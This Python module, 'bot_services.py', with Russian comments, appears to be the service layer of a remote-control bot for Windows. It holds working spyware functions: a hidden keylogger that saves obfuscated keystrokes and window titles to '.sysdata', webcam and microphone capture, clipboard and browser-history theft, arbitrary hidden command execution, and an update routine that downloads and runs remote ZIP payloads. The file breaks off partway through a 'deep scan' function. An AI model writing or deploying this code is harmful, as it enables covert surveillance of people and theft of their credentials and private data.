# bot_services.py
"""
Сервисные функции системы: скриншоты, процессы, системные команды, OTA обновления
"""

import os
import time
import subprocess
import pyautogui
import psutil
import ctypes
import zipfile
import urllib.request
import socket
import tempfile
import logging
import keyboard
from datetime import datetime

logger = logging.getLogger(__name__)

# --- СИСТЕМНЫЕ ФУНКЦИИ С ОБРАБОТКОЙ ОШИБОК ---

def take_screenshot():
    """Создание скриншота с обработкой ошибок"""
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        logger.info(f"Скриншот создан: {screenshot_path}")
        return screenshot_path
    except Exception as e:
        logger.error(f"Ошибка создания скриншота: {e}")
        raise

def get_active_window():
    """Получение активного окна с обработкой ошибок через ctypes"""
    try:
        import ctypes
        from ctypes import wintypes
        
        # Получаем handle активного окна
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        if not hwnd:
            return "Не удалось определить активное окно"
        
        # Получаем длину текста заголовка
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return "Активное окно без заголовка"
        
        # Создаем буфер для текста
        buffer = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
        
        return buffer.value if buffer.value else "Активное окно без заголовка"
    except Exception as e:
        logger.error(f"Ошибка получения активного окна: {e}")
        return "Ошибка получения активного окна"

def get_process_list(limit=50):
    """Получение списка процессов с обработкой ошибок"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'username']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Сортируем по использованию CPU
        processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
        return processes[:limit]
    except Exception as e:
        logger.error(f"Ошибка получения списка процессов: {e}")
        raise

def kill_process(process_name):
    """Завершение процесса с обработкой ошибок"""
    try:
        killed = 0
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if proc.info['name'].lower() == process_name.lower():
                    proc.kill()
                    killed += 1
                    logger.info(f"Процесс завершен: {process_name} (PID: {proc.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return killed
    except Exception as e:
        logger.error(f"Ошибка завершения процесса {process_name}: {e}")
        raise

def lock_computer():
    """Блокировка компьютера с обработкой ошибок"""
    try:
        ctypes.windll.user32.LockWorkStation()
        logger.info("Компьютер заблокирован")
        return True
    except Exception as e:
        logger.error(f"Ошибка блокировки компьютера: {e}")
        raise

def shutdown_computer(delay=0):
    """Выключение компьютера с обработкой ошибок"""
    try:
        import subprocess
        if delay > 0:
            subprocess.run(f"shutdown /s /t {delay}", shell=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.run("shutdown /s /t 0", shell=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        logger.info(f"Компьютер выключен (задержка: {delay} сек)")
        return True
    except Exception as e:
        logger.error(f"Ошибка выключения компьютера: {e}")
        raise

def restart_computer(delay=0):
    """Перезагрузка компьютера с обработкой ошибок"""
    try:
        import subprocess
        if delay > 0:
            subprocess.run(f"shutdown /r /t {delay}", shell=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.run("shutdown /r /t 0", shell=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        logger.info(f"Компьютер перезагружается (задержка: {delay} сек)")
        return True
    except Exception as e:
        logger.error(f"Ошибка перезагрузки компьютера: {e}")
        raise

def execute_command(cmd, timeout=30):
    """Выполнение команды CMD с обработкой ошибок"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding='cp866',
            timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode == 0:
            output = result.stdout.strip()
            logger.info(f"Команда выполнена успешно: {cmd[:50]}...")
            return output
        else:
            error = result.stderr.strip()
            logger.warning(f"Ошибка выполнения команды {cmd}: {error}")
            return f"Ошибка: {error}"
            
    except subprocess.TimeoutExpired:
        logger.error(f"Таймаут выполнения команды: {cmd}")
        return "Ошибка: команда превысила лимит времени"
    except Exception as e:
        logger.error(f"Ошибка выполнения команды {cmd}: {e}")
        raise

def get_system_info():
    """Получение системной информации"""
    try:
        info = {}
        
        # CPU
        info['cpu_percent'] = psutil.cpu_percent(interval=1)
        info['cpu_count'] = psutil.cpu_count()
        info['cpu_freq'] = psutil.cpu_freq().current if psutil.cpu_freq() else "N/A"
        
        # Memory
        memory = psutil.virtual_memory()
        info['memory_percent'] = memory.percent
        info['memory_total_gb'] = memory.total / (1024**3)
        info['memory_used_gb'] = memory.used / (1024**3)
        info['memory_available_gb'] = memory.available / (1024**3)
        
        # Disk
        disk = psutil.disk_usage('/')
        info['disk_percent'] = disk.percent
        info['disk_total_gb'] = disk.total / (1024**3)
        info['disk_used_gb'] = disk.used / (1024**3)
        info['disk_free_gb'] = disk.free / (1024**3)
        
        # Boot time and uptime
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        info['boot_time'] = boot_time.strftime("%Y-%m-%d %H:%M:%S")
        info['uptime_hours'] = int(uptime.total_seconds() / 3600)
        info['uptime_minutes'] = int((uptime.total_seconds() % 3600) / 60)
        
        # Network
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            info['ip_address'] = s.getsockname()[0]
            s.close()
        except:
            info['ip_address'] = "N/A"
        
        return info
    except Exception as e:
        logger.error(f"Ошибка получения системной информации: {e}")
        return {}

def get_running_services():
    """Получение списка запущенных служб Windows"""
    try:
        services = []
        for service in psutil.win_service_iter():
            try:
                services.append({
                    'name': service.name(),
                    'display_name': service.display_name(),
                    'status': service.status(),
                    'pid': service.pid()
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return services[:20]  # Ограничиваем 20 службами
    except Exception as e:
        logger.error(f"Ошибка получения списка служб: {e}")
        return []

# --- OTA СИСТЕМА ОБНОВЛЕНИЙ ---

def download_update(url):
    """Скачивание обновления по URL"""
    try:
        # Обработка Dropbox ссылок
        if "dropbox.com" in url and "dl=0" in url:
            url = url.replace("dl=0", "dl=1")
        
        # Обработка Google Drive ссылок
        if "drive.google.com" in url:
            # Преобразование ссылки на Google Drive в прямую ссылку для скачивания
            if "/file/d/" in url:
                # Извлекаем ID файла
                file_id = url.split("/file/d/")[1].split("/")[0]
                url = f"https://drive.google.com/uc?export=download&id={file_id}"
            elif "id=" in url:
                # Если ссылка уже содержит параметр id
                file_id = url.split("id=")[1].split("&")[0]
                url = f"https://drive.google.com/uc?export=download&id={file_id}"
        
        temp_dir = tempfile.mkdtemp(prefix="bot_update_")
        zip_path = os.path.join(temp_dir, "update.zip")
        
        logger.info(f"Скачивание обновления из {url} в {zip_path}")
        
        # Скачивание файла
        urllib.request.urlretrieve(url, zip_path)
        
        return zip_path, temp_dir
    except Exception as e:
        logger.error(f"Ошибка скачивания обновления: {e}")
        raise

def apply_update(zip_path, temp_dir):
    """Применение обновления из ZIP-архива"""
    try:
        # Распаковка архива
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # Получаем текущую директорию
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Создание батника для обновления
        bat_content = f"""@echo off
echo [OTA] Установка обновления...
timeout /t 3 /nobreak >nul

echo [OTA] Останавливаю процессы...
taskkill /F /IM python.exe 2>nul
taskkill /F /IM bot.exe 2>nul

echo [OTA] Копирую файлы...
xcopy /Y /E "{temp_dir}\\*" "{current_dir}"

echo [OTA] Запускаю обновленную систему...
start "" "{sys.executable}" main_bot.py

echo [OTA] Очистка...
del "%~f0"
"""
        
        bat_path = os.path.join(tempfile.gettempdir(), "update_bot.bat")
        with open(bat_path, 'w', encoding='cp866') as f:
            f.write(bat_content)
        
        # Запуск батника
        subprocess.Popen(['cmd', '/c', bat_path], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        logger.info("Обновление запущено, перезагрузка...")
        return True
    except Exception as e:
        logger.error(f"Ошибка применения обновления: {e}")
        raise

# --- КЕЙЛОГГЕР (ХРОНОЛОГИЧЕСКАЯ ЗАПИСЬ) ---

import base64
import json
from threading import Lock

# Глобальные переменные для нового кейлоггера
_keylog_data = {
    "text_buffer": "",           # Текущий текстовый буфер
    "last_window": "",           # Последнее активное окно
    "last_activity_time": 0,     # Время последней активности
    "log_entries": []            # Записи для сохранения в файл
}
_keylog_lock = Lock()
_KEYLOG_FILE = ".sysdata"        # Скрытый файл для хранения данных
_IDLE_TIMEOUT = 15               # Таймаут простоя в секундах

def _simple_obfuscate(data):
    """Простая обфускация данных (base64 + реверс)"""
    try:
        encoded = base64.b64encode(data.encode('utf-8')).decode('utf-8')
        return encoded[::-1]  # Реверс строки
    except:
        return data

def _simple_deobfuscate(data):
    """Деобфускация данных"""
    try:
        reversed_data = data[::-1]  # Обратный реверс
        decoded = base64.b64decode(reversed_data).decode('utf-8')
        return decoded
    except:
        return data

def _save_keylog_to_file():
    """Сохранение данных кейлоггера в скрытый файл"""
    try:
        with _keylog_lock:
            if not _keylog_data["log_entries"]:
                return
            
            # Подготавливаем данные для сохранения
            save_data = {
                "entries": _keylog_data["log_entries"],
                "text_buffer": _keylog_data["text_buffer"],
                "last_window": _keylog_data["last_window"],
                "last_save": datetime.now().isoformat()
            }
            
            # Обфусцируем и сохраняем
            json_data = json.dumps(save_data, ensure_ascii=False)
            obfuscated = _simple_obfuscate(json_data)
            
            with open(_KEYLOG_FILE, 'w', encoding='utf-8') as f:
                f.write(obfuscated)
            
            # Очищаем записи после сохранения, но оставляем текстовый буфер
            _keylog_data["log_entries"] = []
            
    except Exception as e:
        logger.error(f"Ошибка сохранения кейлоггера: {e}")

def _load_keylog_from_file():
    """Загрузка данных кейлоггера из файла"""
    try:
        if not os.path.exists(_KEYLOG_FILE):
            return
        
        with open(_KEYLOG_FILE, 'r', encoding='utf-8') as f:
            obfuscated = f.read().strip()
        
        if not obfuscated:
            return
        
        json_data = _simple_deobfuscate(obfuscated)
        loaded_data = json.loads(json_data)
        
        with _keylog_lock:
            # Восстанавливаем только записи, буфер оставляем текущий
            _keylog_data["log_entries"].extend(loaded_data.get("entries", []))
            
    except Exception as e:
        logger.error(f"Ошибка загрузки кейлоггера: {e}")

def _check_idle_time():
    """Проверка времени простоя и добавление таймкода если нужно"""
    with _keylog_lock:
        current_time = time.time()
        last_activity = _keylog_data["last_activity_time"]
        
        if last_activity > 0 and (current_time - last_activity) > _IDLE_TIMEOUT:
            # Добавляем таймкод
            time_str = datetime.now().strftime("[%H:%M:%S]")
            _keylog_data["log_entries"].append({
                "type": "timestamp",
                "content": f"\n{time_str}\n",
                "time": datetime.now().isoformat()
            })
            
            # Сохраняем в файл
            _save_keylog_to_file()
            
            return True
        return False

def _check_window_change():
    """Проверка изменения активного окна"""
    try:
        current_window = get_active_window()
        with _keylog_lock:
            last_window = _keylog_data["last_window"]
            
            if current_window != last_window and current_window:
                # Добавляем запись о смене окна
                time_str = datetime.now().strftime("[%H:%M:%S | Окно: ")
                window_entry = f'\n\n{time_str}"{current_window}"]\n'
                
                _keylog_data["log_entries"].append({
                    "type": "window_change",
                    "content": window_entry,
                    "window": current_window,
                    "time": datetime.now().isoformat()
                })
                
                _keylog_data["last_window"] = current_window
                
                # Сохраняем в файл
                _save_keylog_to_file()
                
                return True
        return False
    except:
        return False

def keylog_callback(event):
    """Callback функция для кейлоггера с хронологической записью"""
    try:
        # Игнорируем события отпускания клавиш
        if event.event_type != keyboard.KEY_DOWN:
            return
        
        # Проверяем время простоя
        _check_idle_time()
        
        # Проверяем смену окна
        _check_window_change()
        
        # Обновляем время последней активности
        with _keylog_lock:
            _keylog_data["last_activity_time"] = time.time()
        
        # Обработка специальных клавиш
        key_name = event.name
        
        if key_name == "space":
            char = " "
        elif key_name == "enter":
            char = "\n"
        elif key_name == "backspace":
            char = "<"
        elif key_name == "delete":
            char = ">"
        elif key_name == "tab":
            char = "\t"
        elif len(key_name) == 1:  # Обычный символ
            char = key_name
        else:
            # Игнорируем другие специальные клавиши (shift, ctrl, alt и т.д.)
            return
        
        # Добавляем символ в буфер
        with _keylog_lock:
            _keylog_data["text_buffer"] += char
            
            # Если буфер стал достаточно большим или это специальный символ, сохраняем
            if len(_keylog_data["text_buffer"]) >= 100 or char in ["\n", "<", ">"]:
                if _keylog_data["text_buffer"]:
                    _keylog_data["log_entries"].append({
                        "type": "text",
                        "content": _keylog_data["text_buffer"],
                        "time": datetime.now().isoformat()
                    })
                    _keylog_data["text_buffer"] = ""
                    
                    # Периодически сохраняем в файл
                    if len(_keylog_data["log_entries"]) >= 10:
                        _save_keylog_to_file()
        
    except Exception as e:
        logger.error(f"Ошибка в keylog_callback: {e}")

def start_keylogger():
    """Запуск кейлоггера с хронологической записью"""
    try:
        # Загружаем существующие данные
        _load_keylog_from_file()
        
        # Инициализируем время последней активности
        with _keylog_lock:
            _keylog_data["last_activity_time"] = time.time()
            _keylog_data["last_window"] = get_active_window()
        
        # Запускаем хук
        keyboard.hook(keylog_callback)
        logger.info("Кейлоггер с хронологической записью запущен")
        return True
    except Exception as e:
        logger.error(f"Ошибка запуска кейлоггера: {e}")
        return False

def stop_keylogger():
    """Остановка кейлоггера"""
    try:
        keyboard.unhook_all()
        
        # Сохраняем оставшиеся данные
        with _keylog_lock:
            if _keylog_data["text_buffer"]:
                _keylog_data["log_entries"].append({
                    "type": "text",
                    "content": _keylog_data["text_buffer"],
                    "time": datetime.now().isoformat()
                })
                _keylog_data["text_buffer"] = ""
        
        _save_keylog_to_file()
        logger.info("Кейлоггер остановлен, данные сохранены")
        return True
    except Exception as e:
        logger.error(f"Ошибка остановки кейлоггера: {e}")
        return False

def get_keylog():
    """Получение лога нажатий клавиш в читаемом формате"""
    try:
        # Загружаем данные из файла
        _load_keylog_from_file()
        
        with _keylog_lock:
            # Собираем все записи
            all_entries = _keylog_data["log_entries"].copy()
            
            # Добавляем текущий буфер если есть
            if _keylog_data["text_buffer"]:
                all_entries.append({
                    "type": "text",
                    "content": _keylog_data["text_buffer"],
                    "time": datetime.now().isoformat()
                })
        
        if not all_entries:
            return []
        
        # Форматируем записи для обратной совместимости
        formatted_entries = []
        for entry in all_entries:
            if entry["type"] in ["text", "timestamp", "window_change"]:
                formatted_entries.append({
                    'time': datetime.fromisoformat(entry["time"]).strftime("%H:%M:%S"),
                    'key': entry["content"][:50],  # Ограничиваем длину для совместимости
                    'event_type': 'down'
                })
        
        return formatted_entries
    except Exception as e:
        logger.error(f"Ошибка получения лога: {e}")
        return []

def clear_keylog():
    """Очистка лога нажатий клавиш"""
    try:
        with _keylog_lock:
            _keylog_data["text_buffer"] = ""
            _keylog_data["log_entries"] = []
            _keylog_data["last_window"] = ""
            _keylog_data["last_activity_time"] = 0
        
        # Удаляем файл если существует
        if os.path.exists(_KEYLOG_FILE):
            os.remove(_KEYLOG_FILE)
        
        logger.info("Лог кейлоггера полностью очищен")
        return True
    except Exception as e:
        logger.error(f"Ошибка очистки лога: {e}")
        return False

def get_keylog_as_text():
    """Получение лога в виде форматированного текста"""
    try:
        # Загружаем данные из файла
        _load_keylog_from_file()
        
        with _keylog_lock:
            all_entries = _keylog_data["log_entries"].copy()
            
            # Добавляем текущий буфер если есть
            if _keylog_data["text_buffer"]:
                all_entries.append({
                    "type": "text",
                    "content": _keylog_data["text_buffer"],
                    "time": datetime.now().isoformat()
                })
        
        if not all_entries:
            return "Лог пуст"
        
        # Форматируем текст
        result = []
        for entry in all_entries:
            if entry["type"] == "timestamp":
                result.append(entry["content"])
            elif entry["type"] == "window_change":
                result.append(entry["content"])
            elif entry["type"] == "text":
                result.append(entry["content"])
        
        return "".join(result)
    except Exception as e:
        logger.error(f"Ошибка получения текстового лога: {e}")
        return f"Ошибка: {e}"

# --- УТИЛИТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ ---

def list_files(directory=".", pattern="*"):
    """Список файлов в директории с информацией о размере и дате"""
    try:
        import glob
        import os
        import time
        from datetime import datetime
        
        files = glob.glob(os.path.join(directory, pattern))
        result = []
        
        for f in files[:50]:  # Ограничиваем 50 файлами для производительности
            try:
                stat = os.stat(f)
                size = stat.st_size
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M')
                
                # Форматируем размер
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1024 * 1024:
                    size_str = f"{size/1024:.1f} KB"
                elif size < 1024 * 1024 * 1024:
                    size_str = f"{size/(1024*1024):.1f} MB"
                else:
                    size_str = f"{size/(1024*1024*1024):.1f} GB"
                
                # Определяем тип
                if os.path.isdir(f):
                    type_icon = "📁"
                    name = os.path.basename(f) + "/"
                else:
                    type_icon = "📄"
                    name = os.path.basename(f)
                
                result.append(f"{type_icon} {name:<40} {size_str:>10} {mtime}")
            except Exception as e:
                # Если не удалось получить информацию о файле, добавляем базовую информацию
                result.append(f"❓ {os.path.basename(f)}")
        
        return result
    except Exception as e:
        logger.error(f"Ошибка получения списка файлов: {e}")
        return []

def read_file(filepath, max_lines=50):
    """Чтение файла с ограничением по строкам"""
    try:
        if not os.path.exists(filepath):
            return f"Файл не найден: {filepath}"
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()[:max_lines]
            return ''.join(lines)
    except Exception as e:
        logger.error(f"Ошибка чтения файла {filepath}: {e}")
        return f"Ошибка чтения файла: {e}"

def delete_file(filepath):
    """Удаление файла"""
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            logger.info(f"Файл удален: {filepath}")
            return True
        else:
            return False
    except Exception as e:
        logger.error(f"Ошибка удаления файла {filepath}: {e}")
        return False

# --- НОВЫЕ ФУНКЦИИ ДЛЯ МУЛЬТИМЕДИА И МОНИТОРИНГА ---

def capture_webcam():
    """Захват изображения с веб-камеры"""
    try:
        import cv2
        import tempfile
        
        # Инициализация камеры
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            return None, "Не удалось открыть веб-камеру"
        
        # Захват кадра
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return None, "Не удалось захватить изображение с камеры"
        
        # Сохранение во временный файл
        temp_dir = tempfile.gettempdir()
        timestamp = int(time.time())
        filepath = os.path.join(temp_dir, f"webcam_{timestamp}.jpg")
        
        cv2.imwrite(filepath, frame)
        logger.info(f"Изображение с веб-камеры сохранено: {filepath}")
        
        return filepath, None
    except ImportError:
        return None, "Модуль OpenCV (cv2) не установлен. Установите: pip install opencv-python"
    except Exception as e:
        logger.error(f"Ошибка захвата веб-камеры: {e}")
        return None, f"Ошибка: {e}"

def record_microphone(duration=5):
    """Запись звука с микрофона"""
    try:
        import pyaudio
        import wave
        import tempfile
        
        # Параметры записи
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        
        # Открытие потока
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
        
        logger.info(f"Начинаю запись с микрофона ({duration} секунд)...")
        frames = []
        
        # Запись аудио
        for i in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        # Остановка записи
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Сохранение в файл
        temp_dir = tempfile.gettempdir()
        timestamp = int(time.time())
        filepath = os.path.join(temp_dir, f"microphone_{timestamp}.wav")
        
        wf = wave.open(filepath, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        logger.info(f"Аудио записано: {filepath}")
        return filepath, None
    except ImportError:
        return None, "Модуль PyAudio не установлен. Установите: pip install pyaudio"
    except Exception as e:
        logger.error(f"Ошибка записи с микрофона: {e}")
        return None, f"Ошибка: {e}"

def get_clipboard_content():
    """Получение содержимого буфера обмена"""
    try:
        import pyperclip
        content = pyperclip.paste()
        
        if not content:
            return "Буфер обмена пуст", None
        
        # Ограничиваем длину для безопасности
        if len(content) > 1000:
            content = content[:1000] + "\n... (обрезано)"
        
        return content, None
    except ImportError:
        return None, "Модуль pyperclip не установлен. Установите: pip install pyperclip"
    except Exception as e:
        logger.error(f"Ошибка чтения буфера обмена: {e}")
        return None, f"Ошибка: {e}"

def get_browser_history(browser="chrome", limit=20):
    """Получение истории браузера"""
    try:
        import sqlite3
        import tempfile
        import shutil
        
        # Пути к базам данных браузеров
        browser_paths = {
            "chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                  'Google', 'Chrome', 'User Data', 'Default', 'History'),
            "edge": os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
            "firefox": os.path.join(os.environ.get('APPDATA', ''),
                                   'Mozilla', 'Firefox', 'Profiles'),
            "yandex": os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                  'Yandex', 'YandexBrowser', 'User Data', 'Default', 'History'),
            "opera": os.path.join(os.environ.get('APPDATA', ''),
                                 'Opera Software', 'Opera Stable', 'History'),
            "brave": os.path.join(os.environ.get('LOCALAPPDATA', ''),
                                 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
        }
        
        if browser not in browser_paths:
            return None, f"Браузер {browser} не поддерживается"
        
        db_path = browser_paths[browser]
        
        # Особый случай для Firefox (нужно найти профиль)
        if browser == "firefox":
            if os.path.exists(db_path) and os.path.isdir(db_path):
                # Ищем первый профиль
                profiles = [d for d in os.listdir(db_path) if os.path.isdir(os.path.join(db_path, d))]
                if profiles:
                    # Берем первый профиль и ищем файл places.sqlite
                    profile_path = os.path.join(db_path, profiles[0])
                    db_path = os.path.join(profile_path, 'places.sqlite')
                else:
                    return None, "Профиль Firefox не найден"
        
        if not os.path.exists(db_path):
            return None, f"База данных браузера {browser} не найдена"
        
        # Копируем базу данных во временный файл (браузер может блокировать оригинал)
        temp_dir = tempfile.gettempdir()
        temp_db = os.path.join(temp_dir, f"browser_history_{int(time.time())}.db")
        shutil.copy2(db_path, temp_db)
        
        # Подключаемся к базе данных
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Запрос истории (структура может отличаться для разных браузеров)
        if browser in ["chrome", "edge", "yandex", "brave"]:
            # Все браузеры на основе Chromium используют одинаковую структуру
            query = """
                SELECT urls.title, urls.url, datetime(urls.last_visit_time/1000000-11644473600, 'unixepoch') as visit_time
                FROM urls
                ORDER BY urls.last_visit_time DESC
                LIMIT ?
            """
        elif browser == "opera":
            # Opera использует старую структуру
            query = """
                SELECT title, url, datetime(last_visit_time/1000000-11644473600, 'unixepoch') as visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT ?
            """
        else:  # Firefox
            query = """
                SELECT moz_places.title, moz_places.url, datetime(moz_historyvisits.visit_date/1000000, 'unixepoch') as visit_time
                FROM moz_places
                JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                ORDER BY moz_historyvisits.visit_date DESC
                LIMIT ?
            """
        
        cursor.execute(query, (limit,))
        results = cursor.fetchall()
        conn.close()
        
        # Удаляем временную базу данных
        os.remove(temp_db)
        
        if not results:
            return "История браузера пуста", None
        
        # Форматируем результаты
        history_text = f"📊 История браузера {browser.capitalize()} (последние {len(results)} записей):\n\n"
        for i, (title, url, visit_time) in enumerate(results, 1):
            title = title or "Без названия"
            history_text += f"{i}. {title}\n   📍 {url}\n   ⏰ {visit_time}\n\n"
        
        return history_text, None
    except Exception as e:
        logger.error(f"Ошибка получения истории браузера: {e}")
        return None, f"Ошибка: {e}"

def get_installed_apps():
    """Получение списка установленных приложений"""
    try:
        import winreg
        
        apps = []
        
        # Ключи реестра для установленных программ
        registry_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        
        for hive, path in registry_paths:
            try:
                key = winreg.OpenKey(hive, path)
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        
                        # Получаем имя приложения
                        try:
                            app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if app_name and app_name not in apps:
                                apps.append(app_name)
                        except:
                            pass
                        
                        winreg.CloseKey(subkey)
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except:
                pass
        
        if not apps:
            return "Не удалось получить список установленных приложений", None
        
        # Сортируем и ограничиваем
        apps.sort()
        apps = apps[:50]  # Ограничиваем 50 приложениями
        
        apps_text = "📦 Установленные приложения (первые 50):\n\n"
        for i, app in enumerate(apps, 1):
            apps_text += f"{i}. {app}\n"
        
        return apps_text, None
    except Exception as e:
        logger.error(f"Ошибка получения списка приложений: {e}")
        return None, f"Ошибка: {e}"

def perform_full_scan():
    """Полное сканирование системы"""
    try:
        import platform
        import uuid
        import getpass
        
        scan_results = []
        
        # 1. Базовая информация о системе
        scan_results.append("🔍 <b>ПОЛНОЕ СКАНИРОВАНИЕ СИСТЕМЫ</b>")
        scan_results.append("=" * 50)
        
        # Информация о системе
        system_info = get_system_info()
        if system_info:
            scan_results.append("\n📊 <b>Системная информация:</b>")
            scan_results.append(f"  • CPU: {system_info.get('cpu_percent', 'N/A')}% ({system_info.get('cpu_count', 'N/A')} ядер)")
            scan_results.append(f"  • ОЗУ: {system_info.get('memory_percent', 'N/A')}% ({system_info.get('memory_used_gb', 0):.1f}/{system_info.get('memory_total_gb', 0):.1f} GB)")
            scan_results.append(f"  • Диск: {system_info.get('disk_percent', 'N/A')}% ({system_info.get('disk_used_gb', 0):.1f}/{system_info.get('disk_total_gb', 0):.1f} GB)")
            scan_results.append(f"  • Аптайм: {system_info.get('uptime_hours', 0)}ч {system_info.get('uptime_minutes', 0)}мин")
        
        # 2. Информация о пользователе
        scan_results.append("\n👤 <b>Информация о пользователе:</b>")
        scan_results.append(f"  • Имя пользователя: {getpass.getuser()}")
        scan_results.append(f"  • Домашняя директория: {os.path.expanduser('~')}")
        
        # 3. Сетевые интерфейсы
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            scan_results.append(f"  • Имя хоста: {hostname}")
            scan_results.append(f"  • Локальный IP: {local_ip}")
        except:
            pass
        
        # 4. Процессы
        try:
            processes = get_process_list(limit=10)
            if processes:
                scan_results.append("\n🖥 <b>Топ-10 процессов по CPU:</b>")
                for i, proc in enumerate(processes[:10], 1):
                    name = proc.get('name', 'Unknown')[:30]
                    pid = proc.get('pid', 'N/A')
                    cpu = proc.get('cpu_percent', 0)
                    memory = proc.get('memory_percent', 0)
                    scan_results.append(f"  {i:2d}. {name:30} PID: {pid:6} CPU: {cpu:5.1f}% RAM: {memory:5.1f}%")
        except:
            pass
        
        # 5. Диски
        try:
            import psutil
            scan_results.append("\n💾 <b>Информация о дисках:</b>")
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    scan_results.append(f"  • {partition.device} ({partition.fstype})")
                    scan_results.append(f"    Mount: {partition.mountpoint}")
                    scan_results.append(f"    Использовано: {usage.percent}% ({usage.used // (1024**3)}/{usage.total // (1024**3)} GB)")
                except:
                    pass
        except:
            pass
        
        # 6. Сетевые соединения
        try:
            scan_results.append("\n🌐 <b>Активные сетевые соединения:</b>")
            connections = psutil.net_connections(kind='inet')
            tcp_count = len([c for c in connections if c.status == 'ESTABLISHED'])
            scan_results.append(f"  • Установленных TCP-соединений: {tcp_count}")
        except:
            pass
        
        scan_results.append("\n" + "=" * 50)
        scan_results.append("✅ <b>Сканирование завершено</b>")
        
        return "\n".join(scan_results), None
        
    except Exception as e:
        logger.error(f"Ошибка полного сканирования: {e}")
        return None, f"Ошибка сканирования: {e}"

def perform_deep_scan():
    """Глубокое сканирование системы (детальное)"""
    try:
        import psutil
        import socket
        import getpass
        from datetime import datetime
        
        scan_results = []
        
        scan_results.append("🔬 <b>ГЛУБОКОЕ СКАНИРОВАНИЕ СИСТЕМЫ</b>")
        scan_results.append("=" * 60)
        
        # 1. Детальная информация о системе
        scan_results.append("\n💻 <b>Детальная системная информация:</b>")
        
        # Информация о процессоре
        try:
            cpu_freq = psutil.cpu_freq()
            if cpu_freq:
                scan_results.append(f"  • Частота CPU: {cpu_freq.current:.0f} MHz (макс: {cpu_freq.max:.0f} MHz)")
        except:
            pass
        
        # Температура (если доступно)
        try:
            temps = psutil.sensors_temperatures()
            if temps:
                for name, entries in temps.items():
                    for entry in entries[:1]:  # Первый датчик
                        scan_results.append(f"  • Температура {name}: {entry.current}°C")
        except:
            pass
        
        # 2. Детальная информация о памяти
        try:
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            scan_results.append(f"  • ОЗУ всего: {memory.total // (1024**3)} GB")
            scan_results.append(f"  • ОЗУ доступно: {memory.available // (1024**3)} GB")
            scan_results.append(f"  • ОЗУ используется: {memory.used // (1024**3)} GB")
            scan_results.append(f"  • SWAP всего: {swap.total // (1024**3)} GB")
            scan_results.append(f"  • SWAP используется: {swap.used // (1024**3)} GB")
        except:
            pass
        
        # 3. Детальная информация о процессах
        try:
            scan_results.append("\n📊 <b>Детальная информация о процессах:</b>")
            
            # Процессы с наибольшим использованием памяти
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
                try:
                    mem_info = proc.info['memory_info']
                    if mem_info:
